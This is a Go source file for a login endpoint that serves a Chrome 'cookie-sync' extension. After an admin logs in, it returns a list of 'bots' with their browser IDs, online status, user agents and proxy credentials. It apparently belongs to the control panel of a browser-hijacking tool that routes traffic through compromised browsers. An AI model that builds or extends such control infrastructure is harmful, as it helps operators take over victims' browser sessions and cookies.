package api

import (
	"net/http"

	"github.com/google/uuid"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
	"github.com/s045pd/cursed-go/internal/utils"
)

// ExtAuthAPI provides a lightweight login endpoint for external Chrome
// extensions (cookie-sync) that returns admin auth + bot enumeration in
// a single round-trip, avoiding cookie-based session management.
type ExtAuthAPI struct {
	DB *gorm.DB
}

type extLoginReq struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type extBotInfo struct {
	ID            uuid.UUID `json:"id"`
	Name          string    `json:"name"`
	BrowserID     string    `json:"browser_id"`
	IsOnline      bool      `json:"is_online"`
	State         string    `json:"state"`
	UserAgent     string    `json:"user_agent"`
	ProxyUsername string    `json:"proxy_username"`
	ProxyPassword string    `json:"proxy_password"`
}

// Login is POST /api/v1/ext/login — authenticates admin and returns bot list.
func (a *ExtAuthAPI) Login(w http.ResponseWriter, r *http.Request) {
	var body extLoginReq
	if !MustDecode(w, r, &body) {
		return
	}
	if body.Username == "" || body.Password == "" {
		JSONErr(w, http.StatusBadRequest, "username and password required")
		return
	}

	var u models.User
	if err := a.DB.Where("username = ?", body.Username).First(&u).Error; err != nil {
		JSONErr(w, http.StatusUnauthorized, "invalid credentials")
		return
	}
	if !utils.VerifyPassword(u.Password, body.Password) {
		JSONErr(w, http.StatusUnauthorized, "invalid credentials")
		return
	}

	var bots []models.Bot
	a.DB.Select("id, name, browser_id, is_online, state, user_agent, proxy_username, proxy_password").
		Order(`"createdAt" DESC`).
		Find(&bots)

	out := make([]extBotInfo, 0, len(bots))
	for _, b := range bots {
		out = append(out, extBotInfo{
			ID:            b.ID,
			Name:          b.Name,
			BrowserID:     b.BrowserID,
			IsOnline:      b.IsOnline,
			State:         b.State,
			UserAgent:     b.UserAgent,
			ProxyUsername: b.ProxyUsername,
			ProxyPassword: b.ProxyPassword,
		})
	}

	JSONOK(w, map[string]any{
		"user": map[string]string{"username": u.Username},
		"bots": out,
	})
}
